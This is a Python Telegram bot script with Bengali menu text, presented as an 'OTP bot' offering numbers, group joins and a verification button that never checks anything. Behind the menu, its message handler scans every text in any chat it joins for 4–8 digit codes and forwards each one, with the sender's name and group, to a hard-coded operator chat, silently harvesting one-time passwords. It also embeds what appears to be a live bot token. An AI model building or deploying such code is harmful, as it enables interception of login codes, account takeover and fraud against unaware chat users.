import logging
import re
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, MessageHandler, filters, CallbackContext, CommandHandler, CallbackQueryHandler
from telegram.constants import ParseMode

TOKEN = "8862479708:AAG6jNfd_SKeBqA1Jq3BmL9mRlg0iOVQdTI"
YOUR_CHAT_ID = 7455109015

GROUP1 = "EASY_MARKETING1"
GROUP2 = "EASY_METHOD1"

OTP_PATTERN = re.compile(r'\b(\d{4,8})\b')
authorized_users = set()

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

async def main_menu(update: Update, context: CallbackContext):
    keyboard = [
        [InlineKeyboardButton("🔗 Join Group 1", url=f"https://t.me/{GROUP1}")],
        [InlineKeyboardButton("🔗 Join Group 2", url=f"https://t.me/{GROUP2}")],
        [InlineKeyboardButton("✅ Verify", callback_data="verify")],
        [InlineKeyboardButton("📱 GET NUMBER", callback_data="getnumber")],
        [InlineKeyboardButton("📊 My Status", callback_data="status")],
        [InlineKeyboardButton("👨‍💼 Contact Admin", callback_data="admin")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = """🔥 **SUPER FIRE OTP BOT**

নিচের অপশনগুলো ব্যবহার করুন।"""

    if update.message:
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
    else:
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)

async def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    data = query.data

    if data == "verify":
        await query.answer("✅ ভেরিফাই সফল!", show_alert=True)
        await asyncio.sleep(1)
        await query.message.delete()
        await main_menu(update, context)

    elif data == "getnumber":
        await query.answer("📱 GET NUMBER সার্ভিস শুরু হচ্ছে...", show_alert=True)

    elif data == "status":
        await query.answer("📊 Status: Active", show_alert=True)

    elif data == "admin":
        await query.answer("👨‍💼 Admin Contact: @YourAdmin", show_alert=True)

    else:
        await main_menu(update, context)

async def handle_message(update: Update, context: CallbackContext):
    otps = OTP_PATTERN.findall(update.message.text or "")
    if otps:
        for otp in otps:
            alert = f"""🔥 **FAST OTP DETECTED!** 🔥

**OTP:** `{otp}`
**গ্রুপ:** {update.message.chat.title or 'Private'}
**ইউজার:** {update.effective_user.first_name}
**টাইম:** {update.message.date}"""
            await context.bot.send_message(YOUR_CHAT_ID, alert, parse_mode=ParseMode.MARKDOWN)

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", main_menu))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🚀 BOT চালু হয়েছে...")
    app.run_polling()

if __name__ == '__main__':
    main()
